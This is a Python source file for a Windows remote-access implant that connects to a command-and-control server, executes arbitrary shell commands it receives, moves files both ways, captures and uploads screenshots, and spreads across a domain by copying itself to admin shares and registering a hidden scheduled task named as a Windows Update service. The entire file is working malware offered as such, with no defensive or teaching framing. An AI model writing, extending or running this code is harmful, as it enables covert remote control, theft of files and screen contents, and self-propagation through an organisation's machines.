import os
import sys
import json
import time
import uuid
import socket
import platform
import getpass
import subprocess
import threading
import queue
import base64
import requests
import socketio
import psutil
from PIL import ImageGrab
from io import BytesIO
import win32com.client
import win32security
import win32net
import win32netcon
import win32api
import win32con
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('implant.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class Implant:
    def __init__(self, c2_url, domain_user=None, domain_password=None):
        self.c2_url = c2_url
        self.domain_user = domain_user
        self.domain_password = domain_password
        self.implant_id = str(uuid.uuid4())
        self.sio = socketio.Client(reconnection=True, reconnection_attempts=5)
        self.command_queue = queue.Queue()
        self.running = True
        self.connected = False
        
        # System information
        self.hostname = socket.gethostname()
        self.ip = socket.gethostbyname(self.hostname)
        self.os = platform.platform()
        self.user = getpass.getuser()
        
        # Setup socket.io event handlers
        self.setup_socket_handlers()
    
    def setup_socket_handlers(self):
        """Setup socket.io event handlers"""
        @self.sio.event
        def connect():
            logger.info("Connected to C2 server")
            self.connected = True
            self.register()
        
        @self.sio.event
        def disconnect():
            logger.info("Disconnected from C2 server")
            self.connected = False
            self.reconnect()
        
        @self.sio.on('registered')
        def on_registered(data):
            if data.get('status') == 'success':
                logger.info("Successfully registered with C2 server")
            else:
                logger.error("Registration failed")
                self.sio.disconnect()
        
        @self.sio.on('command')
        def on_command(data):
            command = data.get('command')
            if command and data.get('implant_id') == self.implant_id:
                logger.info(f"Received command: {command}")
                self.command_queue.put(command)
    
    def register(self):
        """Register with the C2 server"""
        try:
            if not self.connected:
                logger.error("Not connected to C2 server")
                return
            
            registration_data = {
                'id': self.implant_id,
                'hostname': self.hostname,
                'ip': self.ip,
                'os': self.os,
                'user': self.user
            }
            logger.info(f"Registering with C2 server: {registration_data}")
            self.sio.emit('register', registration_data)
        except Exception as e:
            logger.error(f"Registration failed: {e}")
            self.sio.disconnect()
    
    def reconnect(self):
        """Attempt to reconnect to the C2 server"""
        if not self.running:
            return
            
        logger.info("Attempting to reconnect...")
        try:
            if not self.sio.connected:
                self.sio.connect(self.c2_url)
        except Exception as e:
            logger.error(f"Reconnection failed: {e}")
            time.sleep(5)
            if self.running:
                self.reconnect()
    
    def execute_command(self, command):
        """Execute a command and return the result"""
        try:
            if command.startswith('upload '):
                return self.handle_upload(command[7:])
            elif command.startswith('download '):
                return self.handle_download(command[9:])
            elif command == 'screenshot':
                return self.handle_screenshot()
            else:
                # Execute shell command
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='utf-8',
                    errors='replace'
                )
                stdout, stderr = process.communicate(timeout=30)
                
                # Format command output
                output = []
                if stdout:
                    output.append("STDOUT:")
                    output.append(stdout)
                if stderr:
                    output.append("STDERR:")
                    output.append(stderr)
                
                return "\n".join(output) if output else "Command executed successfully (no output)"
        except subprocess.TimeoutExpired:
            return "Command timed out after 30 seconds"
        except Exception as e:
            logger.error(f"Command execution failed: {e}")
            return f"Error executing command: {str(e)}"
    
    def handle_upload(self, filename):
        """Handle file upload to implant"""
        try:
            # Download file from C2 server
            response = requests.get(f"{self.c2_url}/uploads/{filename}")
            if response.status_code == 200:
                with open(filename, 'wb') as f:
                    f.write(response.content)
                return f"File {filename} uploaded successfully"
            return f"Failed to download file from C2 server: {response.status_code}"
        except Exception as e:
            return f"Upload failed: {e}"
    
    def handle_download(self, filename):
        """Handle file download from implant"""
        try:
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    file_data = f.read()
                # Upload file to C2 server
                files = {'file': (filename, file_data)}
                response = requests.post(
                    f"{self.c2_url}/api/implants/{self.implant_id}/upload",
                    files=files
                )
                if response.status_code == 200:
                    return f"File {filename} downloaded successfully"
                return f"Failed to upload file to C2 server: {response.status_code}"
            return f"File {filename} not found"
        except Exception as e:
            return f"Download failed: {e}"
    
    def handle_screenshot(self):
        """Take a screenshot and send it to the C2 server"""
        try:
            # Take screenshot
            screenshot = ImageGrab.grab()
            
            # Convert to bytes with compression
            img_byte_arr = BytesIO()
            screenshot.save(img_byte_arr, format='PNG', optimize=True, quality=85)
            img_byte_arr = img_byte_arr.getvalue()
            
            # Generate unique filename with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{self.hostname}_{timestamp}.png"
            
            # Upload to C2 server
            files = {'file': (filename, img_byte_arr)}
            response = requests.post(
                f"{self.c2_url}/api/implants/{self.implant_id}/upload",
                files=files
            )
            
            if response.status_code == 200:
                # Return both success message and filename for the web interface
                return json.dumps({
                    'status': 'success',
                    'message': 'Screenshot captured and uploaded successfully',
                    'filename': filename
                })
            return json.dumps({
                'status': 'error',
                'message': f"Failed to upload screenshot: {response.status_code}"
            })
        except Exception as e:
            return json.dumps({
                'status': 'error',
                'message': f"Screenshot failed: {str(e)}"
            })
    
    def spread_to_domain(self):
        """Attempt to spread to other machines in the domain"""
        if not self.domain_user or not self.domain_password:
            return "Domain credentials not configured"
        
        try:
            # Get list of computers in domain
            computers = win32net.NetServerEnum(
                None, win32netcon.SV_TYPE_WORKSTATION | win32netcon.SV_TYPE_SERVER
            )[0]
            
            spread_results = []
            for computer in computers:
                if computer['name'].lower() != self.hostname.lower():
                    try:
                        # Copy implant to remote machine
                        remote_path = f"\\\\{computer['name']}\\C$\\Windows\\Temp\\implant.exe"
                        if os.path.exists("implant.exe"):
                            # Use WMI to copy file
                            wmi = win32com.client.GetObject("winmgmts:")
                            wmi.CopyFile("implant.exe", remote_path)
                            
                            # Create scheduled task to run implant
                            sch = win32com.client.Dispatch("Schedule.Service")
                            sch.Connect(computer['name'], self.domain_user, self.domain_password)
                            
                            task_def = sch.NewTask(0)
                            task_def.RegistrationInfo.Description = "Windows Update Service"
                            task_def.Settings.Enabled = True
                            task_def.Settings.Hidden = True
                            
                            # Create trigger (run once)
                            trigger = task_def.Triggers.Create(0)
                            trigger.StartBoundary = datetime.now().isoformat()
                            
                            # Create action (run implant)
                            action = task_def.Actions.Create(0)
                            action.Path = remote_path
                            
                            # Register task
                            sch.GetFolder("\\").RegisterTaskDefinition(
                                "WindowsUpdate",
                                task_def,
                                6,  # TASK_CREATE_OR_UPDATE
                                self.domain_user,
                                self.domain_password,
                                0
                            )
                            
                            spread_results.append(f"Successfully spread to {computer['name']}")
                    except Exception as e:
                        spread_results.append(f"Failed to spread to {computer['name']}: {e}")
            
            return "\n".join(spread_results)
        except Exception as e:
            return f"Domain spread failed: {e}"
    
    def command_worker(self):
        """Worker thread to process commands"""
        while self.running:
            try:
                command = self.command_queue.get(timeout=1)
                if command == "spread":
                    result = self.spread_to_domain()
                else:
                    result = self.execute_command(command)
                
                # Send result back to C2 server
                self.sio.emit('command_result', {
                    'implant_id': self.implant_id,
                    'command': command,
                    'result': result,
                    'timestamp': datetime.now().isoformat()
                })
            except queue.Empty:
                continue
            except Exception as e:
                logger.error(f"Command worker error: {e}")
    
    def start(self):
        """Start the implant"""
        try:
            # Connect to C2 server
            logger.info(f"Connecting to C2 server at {self.c2_url}")
            self.sio.connect(self.c2_url)
            
            # Start command worker thread
            worker_thread = threading.Thread(target=self.command_worker)
            worker_thread.daemon = True
            worker_thread.start()
            
            # Keep main thread alive and handle reconnection
            while self.running:
                if not self.connected and not self.sio.connected:
                    logger.info("Connection lost, attempting to reconnect...")
                    self.reconnect()
                time.sleep(1)
                
        except KeyboardInterrupt:
            logger.info("Shutting down implant...")
            self.running = False
            self.sio.disconnect()
        except Exception as e:
            logger.error(f"Implant error: {e}")
            self.running = False
            self.sio.disconnect()

if __name__ == '__main__':
    # Get C2 server URL from command line or use default
    c2_url = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:5000'
    
    # Get domain credentials if provided
    domain_user = os.getenv('DOMAIN_USER')
    domain_password = os.getenv('DOMAIN_PASSWORD')
    
    # Create and start implant
    implant = Implant(c2_url, domain_user, domain_password)
    implant.start() 